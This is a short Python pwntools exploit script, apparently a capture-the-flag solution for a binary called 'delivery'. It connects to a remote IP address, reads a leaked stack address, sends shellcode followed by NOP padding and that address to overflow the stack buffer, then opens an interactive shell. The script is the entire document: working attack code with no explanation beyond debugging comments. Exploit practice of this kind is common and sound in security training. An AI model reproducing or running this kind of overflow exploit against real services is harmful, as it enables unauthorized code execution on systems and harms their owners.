#!/usr/bin/python3
from pwn import *

context.update(arch='amd64',os='linux',terminal=['tmux','new-window'])
e = ELF('delivery')
#io = process(e.path)
#io = gdb.debug(e.path,'''
#break main
#''')
# io.sendline(cyclic(64))
# offset = cyclic_find(b'kaaa') # 40
io = remote('18.222.0.249',1337)
padding = b'\x90' * 17
addr = io.recvuntil(b'Package:').splitlines()[-2].split(b':')[1]
p = make_packer('all')
addr = p(int(addr,16))
with open('shell','rb') as f:
    shellcode = f.read()
payload = shellcode + padding + addr + b'\x00\x00\x00'
io.sendline(payload)
io.interactive()
